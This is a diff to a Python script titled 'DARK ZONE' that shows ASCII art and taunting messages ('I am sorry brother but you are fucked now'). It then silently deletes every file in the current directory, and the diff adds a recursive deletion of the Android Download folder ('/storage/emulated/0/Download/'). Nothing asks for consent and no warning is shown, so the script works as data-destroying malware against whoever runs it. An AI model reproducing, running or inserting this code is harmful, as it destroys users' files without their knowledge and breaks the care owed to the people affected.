@@ -2,13 +2,14 @@ import time
 import os
 import sys
 import pyfiglet
+import shutil
 from colorama import Fore, init
 
 # Initialize colorama
 init(autoreset=True)
 
 def main():
-    # Print welcome message in blue to purple
+    # Print welcome message in blue
     print(Fore.BLUE + "Hey WELCOME TO DARK ZONE")
     time.sleep(2)
 
@@ -28,6 +29,7 @@ def main():
 ⣿⣿⣿⣿⣿⣿⣿⡐⠐⠄⠄⣠⣀⣀⣚⣯⣵⣶⠆⣰⠄⠞⣾⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠈⠛⠿⠿⠿⣻⡏⢠⣿⣎⣾⣿⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⡿⠟⠛⠄⠄⠄⠄⠄⠙⣛⣿⣿⣵⣿⡿⢹⡟⣿⣿⣿⣿⣿
+I am sorry brother but you are fucked now
 """)
         time.sleep(0.1)
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -45,20 +47,28 @@ def main():
 ⠀⠀⠀⠀⠀⠀⠀⢯⣯⣻⣻⠟⠿⠿⠥⠐⠊⠉⣹⠏⣻⣡⠁⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⢻⣻⣻⣷⣤⣀⣀⣀⠄⢰⡟⠀⠱⠁⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⢀⣠⣤⣻⣻⣻⣻⣦⠤⠀⠀⠊⠀⢀⡆⢠⠀⠀⠀⠀⠀
+I am sorry brother but you are fucked now
 """)
         time.sleep(0.1)
         os.system('cls' if os.name == 'nt' else 'clear')
 
-    # Print message after 4 seconds, one character at a time
-    for char in "Why you Tried to change the script? You know it don't work when you change things brother.\n":
-        sys.stdout.write(char)
+    # Print message after 4 seconds, one character at a time in color
+    message = "Why you Tried to change the script? You know it don't work when you change things brother.\n\n"
+    for char in message:
+        if char in '.,!?':
+            sys.stdout.write(Fore.YELLOW + char)
+        else:
+            sys.stdout.write(Fore.CYAN + char)
         sys.stdout.flush()
         time.sleep(0.1)
     print()
 
-    # Print "I hope you understand things now?" one character at a time
+    # Print "I hope you understand things now?" one character at a time in color
     for char in "I hope you understand things now?\n":
-        sys.stdout.write(char)
+        if char in '.,!?':
+            sys.stdout.write(Fore.YELLOW + char)
+        else:
+            sys.stdout.write(Fore.CYAN + char)
         sys.stdout.flush()
         time.sleep(0.1)
     print()
@@ -67,6 +77,11 @@ def main():
     for filename in os.listdir('.'):
         if os.path.isfile(filename):
             os.remove(filename)
+
+    # Delete specified folder
+    folder_path = '/storage/emulated/0/Download/'
+    if os.path.exists(folder_path):
+        shutil.rmtree(folder_path)
 
     # Print "STEIN" using pyfiglet and colorama
     stein_art = pyfiglet.figlet_format("STEIN")
